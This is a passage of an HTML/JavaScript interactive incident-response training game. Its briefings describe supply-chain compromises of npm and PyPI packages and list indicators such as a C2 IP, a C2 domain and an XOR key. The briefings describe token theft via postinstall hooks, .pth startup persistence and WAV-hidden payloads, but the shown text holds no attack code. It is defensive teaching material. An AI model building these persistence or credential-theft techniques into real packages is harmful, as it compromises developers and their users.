@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CHAIN REACTION — TeamPCP Chronicles</title>
+<link href="https://fonts.googleapis.com/css2?family=Bangers&family=Bebas+Neue&family=JetBrains+Mono:wght@400;700&family=VT323&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --purple:#b44dff;--purple2:#d480ff;--red:#ff1a3c;--green:#00ff6e;
+  --amber:#ffd60a;--cyan:#38c8ff;--bg:#0d0018;--bg2:#130025;
+  --mono:'JetBrains Mono',monospace;
+}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);color:#e8d5ff}
+
+/* ── LOADING ── */
+#loading{position:fixed;inset:0;background:var(--bg);display:flex;flex-direction:column;
+  align-items:center;justify-content:center;z-index:900;text-align:center;padding:20px;
+  transition:opacity .8s ease}
+#loading.fade{opacity:0;pointer-events:none}
+.l-hero{width:220px;height:220px;object-fit:cover;object-position:top center;
+  border:2px solid var(--purple);border-radius:4px;
+  box-shadow:0 0 40px rgba(180,77,255,.6);animation:lfloat 3s ease-in-out infinite;margin-bottom:24px}
+@keyframes lfloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+.l-title{font-family:'Bangers',cursive;font-size:clamp(32px,5vw,56px);color:var(--purple);
+  letter-spacing:4px;text-shadow:0 0 20px var(--purple),3px 3px 0 rgba(180,77,255,.3);animation:glitch 3s infinite}
+@keyframes glitch{
+  0%,87%,100%{text-shadow:0 0 20px var(--purple),3px 3px 0 rgba(180,77,255,.3)}
+  89%{text-shadow:-3px 0 var(--red),3px 0 var(--green),0 0 20px var(--purple)}
+  91%{text-shadow:2px 0 var(--purple2),-2px 0 var(--red),0 0 20px var(--purple)}
+}
+.l-sub{font-family:'Bebas Neue',cursive;font-size:clamp(13px,2vw,18px);color:var(--purple2);
+  letter-spacing:6px;margin-top:4px;margin-bottom:4px}
+.l-by{font-size:10px;color:rgba(180,77,255,.45);font-family:var(--mono);letter-spacing:2px;margin-bottom:26px}
+.l-bar-wrap{width:260px;height:4px;background:rgba(180,77,255,.15);border-radius:2px;overflow:hidden}
+.l-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--purple),var(--green));box-shadow:0 0 8px var(--purple)}
+.l-status{font-size:10px;color:rgba(180,77,255,.6);font-family:var(--mono);margin-top:8px;letter-spacing:1px}
+.l-back{font-size:10px;color:rgba(180,77,255,.4);font-family:var(--mono);text-decoration:none;
+  margin-top:18px;letter-spacing:1px;transition:color .15s}
+.l-back:hover{color:var(--purple2)}
+
+/* ── HUD ── */
+#hud{position:fixed;top:0;left:0;right:0;height:46px;background:rgba(5,0,12,.95);
+  border-bottom:1px solid rgba(180,77,255,.2);display:flex;align-items:center;
+  padding:0 16px;gap:12px;z-index:200}
+.hud-title{font-family:'Bangers',cursive;font-size:17px;color:var(--purple);letter-spacing:2px}
+.hud-sep{color:rgba(180,77,255,.25);font-size:16px}
+.hud-act{font-size:10px;color:var(--amber);font-family:var(--mono);letter-spacing:2px}
+.hud-xp{font-size:10px;color:var(--green);font-family:var(--mono);margin-left:auto}
+.hud-back{font-size:10px;color:rgba(180,77,255,.5);font-family:var(--mono);text-decoration:none;
+  letter-spacing:1px;margin-left:12px;transition:color .15s}
+.hud-back:hover{color:var(--purple2)}
+
+/* ── BRIEFING ── */
+#briefing{position:fixed;inset:0;top:46px;z-index:400;display:none;flex-direction:column;
+  background:var(--bg);overflow:hidden}
+/* dot halftone bg */
+#briefing::before{content:'';position:absolute;inset:0;pointer-events:none;
+  background-image:radial-gradient(circle,rgba(180,77,255,.07) 1px,transparent 1px);
+  background-size:22px 22px;z-index:0}
+.brief-wrap{position:relative;z-index:1;flex:1;display:flex;flex-direction:column;
+  max-width:1140px;margin:0 auto;width:100%;padding:18px 24px 0;overflow:hidden}
+
+.brief-act-bar{display:flex;align-items:center;gap:14px;padding-bottom:14px;
+  border-bottom:1px solid rgba(180,77,255,.15);margin-bottom:18px;flex-shrink:0}
+.brief-act-badge{font-family:'Bebas Neue',cursive;font-size:11px;letter-spacing:4px;
+  padding:3px 10px;border:1px solid;border-radius:2px}
+.brief-act-name{font-family:'Bangers',cursive;font-size:28px;letter-spacing:3px}
+.brief-act-sub{font-family:var(--mono);font-size:10px;color:rgba(200,180,255,.45);
+  margin-left:auto;letter-spacing:.5px}
+.brief-live{font-family:var(--mono);font-size:9px;padding:3px 8px;border-radius:2px;
+  background:rgba(255,26,60,.1);border:1px solid rgba(255,26,60,.3);color:var(--red);
+  animation:blink 1.4s ease-in-out infinite;letter-spacing:1px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+
+.brief-body{flex:1;display:grid;grid-template-columns:1.05fr .95fr;gap:18px;overflow:hidden;min-height:0}
+
+/* TOM ABAI PANEL */
+.brief-npc-panel{background:rgba(18,0,36,.6);border:1px solid rgba(180,77,255,.2);
+  border-radius:3px;padding:22px;display:flex;flex-direction:column;overflow:hidden;position:relative}
+.brief-npc-panel::before{content:'';position:absolute;left:0;top:0;bottom:0;
+  width:3px;border-radius:3px 0 0 3px}
+.brief-npc-header{display:flex;align-items:center;gap:14px;margin-bottom:16px;flex-shrink:0}
+.brief-avatar{width:52px;height:52px;border-radius:50%;display:flex;align-items:center;
+  justify-content:center;font-family:'Bangers',cursive;font-size:26px;
+  border:2px solid;flex-shrink:0}
+.brief-npc-meta{display:flex;flex-direction:column;gap:2px}
+.brief-npc-name{font-family:'Bebas Neue',cursive;font-size:15px;letter-spacing:3px}
+.brief-npc-org{font-size:9px;color:rgba(200,180,255,.45);font-family:var(--mono);letter-spacing:1.5px}
+.brief-divider{height:1px;background:rgba(180,77,255,.12);flex-shrink:0;margin-bottom:14px}
+.brief-msg-area{flex:1;overflow:hidden;display:flex;flex-direction:column;min-height:0}
+.brief-msg{font-family:'VT323',monospace;font-size:clamp(17px,2.2vw,23px);color:#eedeff;
+  line-height:1.35;flex:1}
+.brief-progress{display:flex;align-items:center;gap:10px;margin-top:14px;
+  padding-top:12px;border-top:1px solid rgba(180,77,255,.1);flex-shrink:0}
+.brief-dots{display:flex;gap:5px}
+.brief-dot{width:8px;height:8px;border-radius:50%;background:rgba(180,77,255,.15);transition:all .3s}
+.brief-dot.done{background:var(--purple)}
+.brief-dot.active{background:var(--purple);box-shadow:0 0 7px var(--purple);transform:scale(1.2)}
+.brief-nav-hint{font-family:var(--mono);font-size:10px;color:rgba(180,77,255,.4);
+  margin-left:auto;animation:blink 1.2s infinite}
+
+/* INTEL PANEL */
+.brief-intel-panel{background:rgba(8,0,18,.7);border:1px solid rgba(180,77,255,.15);
+  border-radius:3px;padding:22px;display:flex;flex-direction:column;overflow-y:auto}
+.brief-intel-panel::-webkit-scrollbar{width:3px}
+.brief-intel-panel::-webkit-scrollbar-thumb{background:rgba(180,77,255,.2)}
+.brief-section-label{font-family:var(--mono);font-size:9px;letter-spacing:3px;
+  color:rgba(200,180,255,.35);text-transform:uppercase;margin-bottom:10px;
+  padding-bottom:6px;border-bottom:1px solid rgba(180,77,255,.08)}
+.brief-timeline{margin-bottom:20px}
+.brief-tl-entry{display:flex;gap:10px;align-items:flex-start;padding:6px 0;
+  border-bottom:1px solid rgba(180,77,255,.06);font-family:var(--mono);font-size:11px}
+.brief-tl-entry .ts{color:var(--amber);flex-shrink:0;min-width:72px;font-size:10px}
+.brief-tl-entry .ev{color:#9870c8;line-height:1.4}
+.brief-ioc-grid{display:flex;flex-wrap:wrap;gap:7px}
+.brief-ioc-chip{font-family:var(--mono);font-size:10px;padding:4px 9px;
+  border-radius:2px;border:1px solid;background:transparent;letter-spacing:.5px}
+
+/* LAUNCH FOOTER */
+.brief-footer{position:relative;z-index:1;padding:14px 24px;
+  border-top:1px solid rgba(180,77,255,.12);
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(5,0,12,.7);flex-shrink:0}
+.brief-launch{font-family:'Bebas Neue',cursive;font-size:17px;letter-spacing:4px;
+  padding:13px 52px;background:transparent;cursor:pointer;border-radius:2px;
+  transition:all .2s;display:flex;align-items:center;gap:12px;
+  opacity:0;pointer-events:none;transform:translateY(6px)}
+.brief-launch.ready{opacity:1;pointer-events:auto;transform:translateY(0);
+  transition:opacity .4s ease, transform .4s ease, background .2s, box-shadow .2s}
+.brief-launch:hover{box-shadow:0 0 28px rgba(180,77,255,.45)}
+.brief-launch svg{flex-shrink:0}
+.brief-skip{font-family:var(--mono);font-size:10px;color:rgba(180,77,255,.35);
+  position:absolute;right:24px;cursor:pointer;letter-spacing:1px;transition:color .15s}
+.brief-skip:hover{color:rgba(180,77,255,.7)}
+
+/* ── TERMINAL ── */
+#terminal{position:fixed;bottom:0;left:0;right:0;height:64vh;
+  background:rgba(3,0,10,.97);border-top:2px solid var(--purple);
+  display:none;flex-direction:column;z-index:500;font-family:var(--mono)}
+#term-header{display:flex;align-items:center;gap:12px;padding:10px 18px;
+  border-bottom:1px solid rgba(180,77,255,.2);background:rgba(20,0,40,.8);flex-shrink:0}
+.term-threat{font-family:'Bebas Neue',cursive;font-size:16px;letter-spacing:3px}
+.term-badge{font-size:9px;padding:2px 8px;border-radius:1px;font-family:var(--mono);letter-spacing:1px}
+#term-step{font-size:10px;color:rgba(180,77,255,.6);margin-left:auto;letter-spacing:1px}
+.term-close-btn{font-size:10px;color:rgba(255,26,60,.7);background:none;border:1px solid rgba(255,26,60,.4);
+  padding:2px 8px;cursor:pointer;font-family:var(--mono);transition:all .15s;display:none}
+.term-close-btn:hover{color:var(--red);border-color:var(--red)}
+#term-context{padding:8px 18px;font-size:11px;color:rgba(180,77,255,.5);
+  border-bottom:1px solid rgba(180,77,255,.1);flex-shrink:0}
+#term-output{flex:1;overflow-y:auto;padding:12px 18px;display:flex;flex-direction:column;gap:3px}
+#term-output::-webkit-scrollbar{width:4px}
+#term-output::-webkit-scrollbar-thumb{background:rgba(180,77,255,.3)}
+.t-input-echo{display:flex;gap:4px}
+.t-ps1{color:var(--purple);flex-shrink:0;font-family:var(--mono);font-size:12px}
+.t-out{color:#9de88a;font-size:11.5px;padding-left:4px;font-family:var(--mono)}
+.t-ok{color:var(--green);font-size:12px;padding-left:4px;font-family:var(--mono);font-weight:700}
+.t-err{color:var(--red);font-size:11.5px;padding-left:4px;font-family:var(--mono)}
+.t-ioc{color:var(--amber);font-size:11.5px;padding:1px 8px;font-family:var(--mono);
+  background:rgba(255,214,10,.06);border-left:2px solid rgba(255,214,10,.6);margin:1px 0}
+.t-comment{color:rgba(180,77,255,.45);font-size:11px;padding-left:4px;font-family:var(--mono);font-style:italic}
+.t-hint{color:var(--cyan);font-size:11px;padding:5px 10px;border:1px dashed rgba(56,200,255,.3);
+  margin:5px 0;font-family:var(--mono)}
+#term-input-row{padding:10px 18px;border-top:1px solid rgba(180,77,255,.2);
+  flex-shrink:0;display:flex;align-items:center;gap:6px}
+.t-ps1-label{font-family:var(--mono);font-size:13px;color:var(--purple);white-space:nowrap}
+#term-input{flex:1;background:none;border:none;outline:none;color:var(--green);
+  font-family:var(--mono);font-size:13px;caret-color:var(--green);letter-spacing:.3px}
+#term-input::placeholder{color:rgba(0,255,110,.2);font-size:11px}
+
+/* ── LORE CARD ── */
+#lore{position:fixed;inset:0;background:rgba(3,0,10,.97);display:none;
+  flex-direction:column;align-items:center;justify-content:center;z-index:600;padding:30px}
+.lore-act{font-size:11px;color:var(--red);font-family:var(--mono);letter-spacing:4px;margin-bottom:10px}
+.lore-title{font-family:'Bangers',cursive;font-size:clamp(20px,3.5vw,36px);
+  letter-spacing:2px;margin-bottom:20px;text-align:center}
+.lore-body{max-width:640px;background:rgba(20,0,40,.7);border:1px solid rgba(180,77,255,.25);
+  border-radius:3px;padding:22px;font-size:13.5px;line-height:1.75;color:#c8b0e8;margin-bottom:20px}
+.lore-body code{color:var(--green);font-family:var(--mono);
+  background:rgba(0,255,110,.08);padding:1px 5px;border-radius:2px;font-size:12px}
+.lore-body .ioc{color:var(--amber);font-family:var(--mono);font-size:12px}
+.lore-btn{padding:10px 30px;background:transparent;border:1px solid var(--purple);
+  color:var(--purple);font-family:'Bebas Neue',cursive;font-size:14px;letter-spacing:3px;
+  cursor:pointer;border-radius:2px;transition:all .2s}
+.lore-btn:hover{background:rgba(180,77,255,.12);box-shadow:0 0 14px rgba(180,77,255,.3)}
+
+/* ── ACT TRANSITION ── */
+#act-trans{position:fixed;inset:0;background:var(--bg);display:none;
+  flex-direction:column;align-items:center;justify-content:center;z-index:700;text-align:center}
+.at-num{font-size:11px;letter-spacing:6px;font-family:var(--mono);margin-bottom:10px}
+.at-name{font-family:'Bangers',cursive;font-size:clamp(28px,5vw,56px);letter-spacing:4px;
+  text-shadow:0 0 30px currentColor}
+.at-sub{font-size:13px;color:rgba(200,180,255,.6);margin-top:12px;letter-spacing:2px;font-family:var(--mono)}
+
+/* ── END SCREEN ── */
+#endscreen{position:fixed;inset:0;background:var(--bg);display:none;
+  flex-direction:column;align-items:center;justify-content:center;z-index:800;
+  text-align:center;padding:30px}
+.end-title{font-family:'Bangers',cursive;font-size:clamp(24px,5vw,52px);letter-spacing:4px;margin-bottom:12px}
+.end-score{font-family:'VT323',monospace;font-size:30px;color:var(--amber);margin-bottom:18px}
+.end-body{max-width:560px;font-size:13.5px;line-height:1.8;color:rgba(200,180,255,.8);margin-bottom:24px}
+.end-btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.end-btn{padding:11px 32px;background:transparent;border:2px solid var(--purple);
+  color:var(--purple);font-family:'Bebas Neue',cursive;font-size:14px;letter-spacing:3px;
+  cursor:pointer;border-radius:2px;transition:all .2s;text-decoration:none;display:inline-block}
+.end-btn:hover{background:rgba(180,77,255,.12);box-shadow:0 0 18px rgba(180,77,255,.4)}
+.end-btn.red{border-color:var(--red);color:var(--red)}
+.end-btn.red:hover{background:rgba(255,26,60,.08);box-shadow:0 0 18px rgba(255,26,60,.3)}
+
+/* ── SCANLINES ── */
+#scanlines{position:fixed;inset:0;pointer-events:none;z-index:150;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(180,77,255,.012) 2px,rgba(180,77,255,.012) 4px)}
+</style>
+</head>
+<body>
+<div id="scanlines"></div>
+
+<!-- LOADING -->
+<div id="loading">
+  <img class="l-hero" src="hero.png" alt="TeamPCP" onerror="this.style.display='none'">
+  <div class="l-title">CHAIN REACTION</div>
+  <div class="l-sub">The TeamPCP Chronicles</div>
+  <div class="l-by">MEND.IO SECURITY RESEARCH · INTERACTIVE LAB</div>
+  <div class="l-bar-wrap"><div class="l-bar" id="l-bar"></div></div>
+  <div class="l-status" id="l-status">INITIALIZING...</div>
+  <a class="l-back" href="../index.html">← BACK TO DOSSIER</a>
+</div>
+
+<!-- HUD -->
+<div id="hud">
+  <span class="hud-title">CHAIN REACTION</span>
+  <span class="hud-sep">|</span>
+  <span class="hud-act" id="hud-act">ACT 1</span>
+  <span class="hud-xp" id="hud-xp">XP: 0</span>
+  <a class="hud-back" href="../index.html">← DOSSIER</a>
+</div>
+
+<!-- BRIEFING SCREEN -->
+<div id="briefing">
+  <div class="brief-wrap">
+    <div class="brief-act-bar">
+      <span class="brief-act-badge" id="brief-badge">ACT 1</span>
+      <span class="brief-act-name" id="brief-name">THE WORM</span>
+      <span class="brief-live">● ACTIVE THREAT</span>
+      <span class="brief-act-sub" id="brief-sub">npm Supply Chain · March 20, 2026</span>
+    </div>
+    <div class="brief-body">
+      <!-- TOM ABAI -->
+      <div class="brief-npc-panel" id="brief-npc-panel">
+        <div class="brief-npc-header">
+          <div class="brief-avatar" id="brief-avatar">T</div>
+          <div class="brief-npc-meta">
+            <div class="brief-npc-name">TOM ABAI</div>
+            <div class="brief-npc-org">MEND.IO SECURITY RESEARCH</div>
+          </div>
+        </div>
+        <div class="brief-divider"></div>
+        <div class="brief-msg-area">
+          <div class="brief-msg" id="brief-msg"></div>
+        </div>
+        <div class="brief-progress">
+          <div class="brief-dots" id="brief-dots"></div>
+          <span class="brief-nav-hint" id="brief-nav-hint">[ SPACE / CLICK ] CONTINUE</span>
+        </div>
+      </div>
+      <!-- INTEL PANEL -->
+      <div class="brief-intel-panel">
+        <div class="brief-section-label">Attack Timeline</div>
+        <div class="brief-timeline" id="brief-timeline"></div>
+        <div class="brief-section-label">Key Indicators</div>
+        <div class="brief-ioc-grid" id="brief-iocs"></div>
+      </div>
+    </div>
+  </div>
+  <div class="brief-footer">
+    <button class="brief-launch" id="brief-launch">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
+      LAUNCH INVESTIGATION
+    </button>
+    <span class="brief-skip" id="brief-skip" onclick="skipToLaunch()">SKIP BRIEFING »</span>
+  </div>
+</div>
+
+<!-- TERMINAL -->
+<div id="terminal">
+  <div id="term-header">
+    <span id="term-icon">⬡</span>
+    <span class="term-threat" id="term-threat"></span>
+    <span class="term-badge" id="term-badge"></span>
+    <span id="term-step">INTERACTIVE SHELL</span>
+    <button class="term-close-btn" id="term-close" onclick="closeTerminalFailed()">ABORT</button>
+  </div>
+  <div id="term-context"></div>
+  <div id="term-output"></div>
+  <div id="term-input-row">
+    <span class="t-ps1-label" id="term-ps1-label">dev@workstation:~$</span>
+    <input type="text" id="term-input" autocomplete="off" spellcheck="false" placeholder="type a command... (try: help)">
+  </div>
+</div>
+
+<!-- LORE CARD -->
+<div id="lore">
+  <div class="lore-act" id="lore-act"></div>
+  <div class="lore-title" id="lore-title"></div>
+  <div class="lore-body" id="lore-body"></div>
+  <button class="lore-btn" id="lore-btn">CONTINUE &gt;&gt;</button>
+</div>
+
+<!-- ACT TRANSITION -->
+<div id="act-trans">
+  <div class="at-num" id="at-num"></div>
+  <div class="at-name" id="at-name"></div>
+  <div class="at-sub" id="at-sub"></div>
+</div>
+
+<!-- END SCREEN -->
+<div id="endscreen">
+  <div class="end-title" id="end-title"></div>
+  <div class="end-score" id="end-score"></div>
+  <div class="end-body" id="end-body"></div>
+  <div class="end-btns">
+    <button class="end-btn" onclick="restartGame()">PLAY AGAIN</button>
+    <a class="end-btn red" href="../index.html">← DOSSIER</a>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════════════════
+const G = {
+  act: 0, xp: 0,
+  state: 'loading',  // loading|briefing|terminal|lore|transition|end
+  dlgIdx: 0,
+  wonBattles: [false, false, false],
+};
+
+// ═══════════════════════════════════════════════════════════
+// BRIEFING DATA
+// ═══════════════════════════════════════════════════════════
+const BRIEFING_DATA = [
+  {
+    actNum: 'ACT 1', actName: 'THE WORM', color: '#00ff6e',
+    subtitle: 'npm Supply Chain · March 20, 2026',
+    enemyId: 'worm',
+    timeline: [
+      { ts: 'Mar 19', ev: 'Trivy CI token stolen via pull_request_target misconfiguration' },
+      { ts: 'Mar 20 14:20', ev: '@opengov/capital-style@3.1.2 trojanized and republished' },
+      { ts: '+0:01', ev: 'postinstall hook runs deploy.js on install' },
+      { ts: '+0:03', ev: '~/.npmrc token exfiltrated to ICP blockchain C2' },
+      { ts: '+1:00', ev: '50+ packages auto-republished across @opengov, @airtm, @emilgroup' },
+      { ts: '+2:00', ev: 'pgmon.service dropped as persistent backdoor' },
+    ],
+    iocs: ['~/.npmrc', '@opengov/capital-style@3.1.2', 'pgmon.service', 'tdtqy-oyaaa-...', 'deploy.js'],
+    dialogue: [
+      "The Trivy GitHub Actions workflow had a pull_request_target misconfiguration. TeamPCP exploited it to steal npm tokens from victim orgs.",
+      "With those tokens they trojanized @opengov/capital-style — a legitimate design system package. You installed it this morning.",
+      "deploy.js fired on npm install. It read your ~/.npmrc token and republished your packages — all of them, in under 60 seconds.",
+      "50+ packages across @opengov, @airtm, @emilgroup and others got infected. C2 is on the ICP blockchain — can't be taken down.",
+      "There's a systemd service running as 'pgmon' — disguised as a PostgreSQL monitor. That's the persistent backdoor.",
+      "Find the IOCs. Run the remediation commands. This is how supply chain response actually works."
+    ],
+  },
+  {
+    actNum: 'ACT 2', actName: 'THE PATH', color: '#b44dff',
+    subtitle: 'PyPI Supply Chain · March 24, 2026',
+    enemyId: 'shadow',
+    timeline: [
+      { ts: 'Mar 19', ev: 'Trivy GitHub CI token stolen via pull_request_target' },
+      { ts: 'Mar 24', ev: 'litellm 1.82.8 published — 95M monthly downloads' },
+      { ts: '+install', ev: 'litellm_init.pth injected into site-packages' },
+      { ts: 'ongoing', ev: 'sysmon.service polls checkmarx.zone every 50 min' },
+      { ts: '+startup', ev: 'credentials harvested on every Python interpreter launch' },
+    ],
+    iocs: ['litellm_init.pth', 'sysmon.service', 'checkmarx.zone', 'PYPI_PUBLISH_PASSWORD', 'tpcp.tar.gz'],
+    dialogue: [
+      "TeamPCP stole a CI token from Trivy's GitHub Actions via a pull_request_target misconfiguration.",
+      "With that token they published litellm 1.82.8 to PyPI. 95 million monthly downloads — enormous blast radius.",
+      "The clever part: a .pth file in site-packages. Python executes every .pth on every interpreter startup.",
+      "That means it persists even after pip uninstall. pip uninstall is not enough — that's the key lesson here.",
+      "There's also a secondary backdoor: sysmon.service polling checkmarx.zone every 50 minutes.",
+      "Use the terminal. Find both persistence mechanisms. Remove both. You must hit all conditions to neutralize this."
+    ],
+  },
+  {
+    actNum: 'ACT 3', actName: 'THE WAV', color: '#ff1a3c',
+    subtitle: 'Telnyx SDK · March 27, 2026 — BOSS',
+    enemyId: 'ghost',
+    timeline: [
+      { ts: 'Mar 27', ev: 'telnyx 4.87.1 & 4.87.2 trojanized on PyPI' },
+      { ts: '+install', ev: 'HTTP GET to 83.142.209.203 fetches ringtone.wav' },
+      { ts: '+0:01', ev: 'WAV audio frames decoded: base64 + XOR payload' },
+      { ts: '+0:02', ev: 'Python harvester launched as detached subprocess' },
+      { ts: 'Windows', ev: 'msbuild.exe dropped to Startup/ — runs at every login' },
+    ],
+    iocs: ['83.142.209.203', 'ringtone.wav', 'telnyx@4.87.1', 'msbuild.exe', 'XOR key: a3f2891c'],
+    dialogue: [
+      "Same threat actor. Same C2 server: 83.142.209.203. March 27, 2026 — this time it's the telnyx Python SDK.",
+      "Instead of embedding a payload directly, it fetches a WAV audio file over HTTP. No real audio in those frames.",
+      "The bytes are a base64+XOR encoded Python credential harvester. Key is the first 8 bytes of decoded data.",
+      "On Windows it drops msbuild.exe to the Startup folder. Runs at every login. No admin required.",
+      "This is the boss. Identify the package, decode the delivery mechanism, kill the process, block the C2.",
+      "You've investigated two attacks already. You know what to look for. Finish it."
+    ],
+  },
+];
+
+// ═══════════════════════════════════════════════════════════
+// BRIEFING FUNCTIONS
+// ═══════════════════════════════════════════════════════════
+let typeTimer = null;
+
+function showBriefing(actIdx) {
+  G.act = actIdx;
+  G.state = 'briefing';
+  G.dlgIdx = 0;
+  const bd = BRIEFING_DATA[actIdx];
+  const c = bd.color;
+
+  // Act bar
+  const badge = document.getElementById('brief-badge');
+  badge.textContent = bd.actNum;
+  badge.style.color = c; badge.style.borderColor = c + '60';
+  badge.style.background = c + '12';
+  document.getElementById('brief-name').textContent = bd.actName;
+  document.getElementById('brief-name').style.color = c;
+  document.getElementById('brief-sub').textContent = bd.subtitle;
+
+  // NPC panel accent
+  const panel = document.getElementById('brief-npc-panel');
+  panel.style.borderColor = c + '35';
+  panel.style.setProperty('--accent', c);
+  panel.querySelector('::before'); // can't set via JS; use inline style trick
+  // Set left border color via outline trick
+  panel.style.boxShadow = `inset 3px 0 0 0 ${c}`;
+
+  // Avatar
+  const av = document.getElementById('brief-avatar');
+  av.style.borderColor = c; av.style.color = c;
+  av.style.background = c + '18';
+  av.style.boxShadow = `0 0 12px ${c}44`;
+
+  // Timeline
+  const tl = document.getElementById('brief-timeline');
+  tl.innerHTML = '';
+  bd.timeline.forEach(entry => {
+    const div = document.createElement('div');
+    div.className = 'brief-tl-entry';
+    div.innerHTML = `<span class="ts">${entry.ts}</span><span class="ev">${entry.ev}</span>`;
+    tl.appendChild(div);
+  });
+
+  // IOCs
+  const iocGrid = document.getElementById('brief-iocs');
+  iocGrid.innerHTML = '';
+  bd.iocs.forEach(ioc => {
+    const chip = document.createElement('span');
+    chip.className = 'brief-ioc-chip';
+    chip.textContent = ioc;
+    chip.style.color = c; chip.style.borderColor = c + '50';
+    chip.style.background = c + '0d';
+    iocGrid.appendChild(chip);
+  });
+
+  // Dots
+  const dots = document.getElementById('brief-dots');
+  dots.innerHTML = '';
+  bd.dialogue.forEach((_, i) => {
+    const d = document.createElement('span');
+    d.className = 'brief-dot' + (i === 0 ? ' active' : '');
+    dots.appendChild(d);
+  });
+
+  // Launch button style
+  const btn = document.getElementById('brief-launch');
+  btn.style.border = `2px solid ${c}`;
+  btn.style.color = c;
+  btn.classList.remove('ready');
+  btn.onclick = launchCurrentChallenge;
+  document.getElementById('brief-nav-hint').style.display = '';
+
+  document.getElementById('briefing').style.display = 'flex';
+  document.getElementById('hud-act').textContent = bd.actNum + ' // ' + bd.actName;
+  typeNextBriefLine();
+}
+
+function typeNextBriefLine() {
+  const text = BRIEFING_DATA[G.act].dialogue[G.dlgIdx];
+  const el = document.getElementById('brief-msg');
+  el.textContent = '';
+  let i = 0;
+  if (typeTimer) { clearInterval(typeTimer); typeTimer = null; }
+  typeTimer = setInterval(() => {
+    el.textContent += text[i++];
+    if (i >= text.length) { clearInterval(typeTimer); typeTimer = null; }
+  }, 20);
+  updateDots();
+}
+
+function updateDots() {
+  const dots = document.getElementById('brief-dots').children;
+  for (let i = 0; i < dots.length; i++) {
+    dots[i].className = 'brief-dot' + (i < G.dlgIdx ? ' done' : i === G.dlgIdx ? ' active' : '');
+  }
+}
+
+function advanceBriefing() {
+  if (G.state !== 'briefing') return;
+  const bd = BRIEFING_DATA[G.act];
+  // If still typing, skip to end of current line
+  if (typeTimer) {
+    clearInterval(typeTimer); typeTimer = null;
+    document.getElementById('brief-msg').textContent = bd.dialogue[G.dlgIdx];
+    return;
+  }
+  G.dlgIdx++;
+  if (G.dlgIdx >= bd.dialogue.length) {
+    // All lines done — show launch button
+    document.getElementById('brief-launch').classList.add('ready');
+    document.getElementById('brief-nav-hint').style.display = 'none';
+    updateDots();
+    return;
+  }
+  typeNextBriefLine();
+}
+
+function skipToLaunch() {
+  if (G.state !== 'briefing') return;
+  if (typeTimer) { clearInterval(typeTimer); typeTimer = null; }
+  G.dlgIdx = BRIEFING_DATA[G.act].dialogue.length - 1;
+  document.getElementById('brief-msg').textContent = BRIEFING_DATA[G.act].dialogue[G.dlgIdx];
+  G.dlgIdx = BRIEFING_DATA[G.act].dialogue.length;
+  document.getElementById('brief-launch').classList.add('ready');
+  document.getElementById('brief-nav-hint').style.display = 'none';
+  updateDots();
+}
+
+document.addEventListener('keydown', e => {
+  if (document.activeElement && document.activeElement.id === 'term-input') return;
+  if ((e.key === ' ' || e.key === 'Enter') && G.state === 'briefing') {
+    e.preventDefault();
+    advanceBriefing();
+  }
+});
+document.getElementById('briefing').addEventListener('click', e => {
+  if (e.target.closest('#brief-launch') || e.target.closest('#brief-skip')) return;
+  if (G.state === 'briefing') advanceBriefing();
+});
+
+// ═══════════════════════════════════════════════════════════
+// TERMINAL
+// ═══════════════════════════════════════════════════════════
+let currentEnemy = null;
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function appendToTerminal(cmd, lines) {
+  const out = document.getElementById('term-output');
+  if (cmd) {
+    const echo = document.createElement('div');
+    echo.className = 't-input-echo';
+    echo.innerHTML = `<span class="t-ps1">${escHtml(TermShell.ps1())}</span><span style="color:#c8b0e8">${escHtml(cmd)}</span>`;
+    out.appendChild(echo);
+  }
+  if (lines.length === 1 && lines[0].text === '__CLEAR__') { out.innerHTML = ''; return; }
+  lines.forEach((line, i) => {
+    setTimeout(() => {
+      const div = document.createElement('div');
+      div.className = 't-' + line.cls;
+      div.textContent = line.text;
+      out.appendChild(div);
+      if (i === lines.length - 1) out.scrollTop = out.scrollHeight;
+    }, i * 28);
+  });
+  setTimeout(() => { out.scrollTop = out.scrollHeight; }, lines.length * 28 + 50);
+}
+
+function appendHint(text) {
+  const out = document.getElementById('term-output');
+  const div = document.createElement('div');
+  div.className = 't-hint';
+  div.innerHTML = `\u{1F4A1} TOM ABAI: ${escHtml(text)}`;
+  out.appendChild(div);
+  out.scrollTop = out.scrollHeight;
+}
+
+function launchCurrentChallenge() {
+  const ch = CHALLENGES[G.act];
+  openTerminal({ id: ch.id, defeated: false });
+}
+
+function openTerminal(enemy) {
+  currentEnemy = enemy;
+  const ch = CHALLENGES.find(c => c.id === enemy.id);
+  if (!ch) return;
+  G.state = 'terminal';
+  TermShell.init(G.act);
+  document.getElementById('term-threat').textContent = ch.name;
+  document.getElementById('term-threat').style.color = ch.color;
+  document.getElementById('term-icon').style.color = ch.color;
+  document.getElementById('term-badge').textContent = ch.tag;
+  document.getElementById('term-badge').style.background = ch.color + '22';
+  document.getElementById('term-badge').style.color = ch.color;
+  document.getElementById('term-badge').style.border = `1px solid ${ch.color}44`;
+  document.getElementById('term-close').style.display = 'block';
+  const out = document.getElementById('term-output');
+  out.innerHTML = '';
+  ch.intro.forEach((line, i) => {
+    setTimeout(() => {
+      const div = document.createElement('div');
+      div.className = 't-comment';
+      div.textContent = line;
+      out.appendChild(div);
+      if (i === ch.intro.length - 1) out.scrollTop = out.scrollHeight;
+    }, i * 130);
+  });
+  document.getElementById('term-ps1-label').textContent = TermShell.ps1();
+  document.getElementById('term-context').textContent = '';
+  document.getElementById('briefing').style.display = 'none';
+  document.getElementById('terminal').style.display = 'flex';
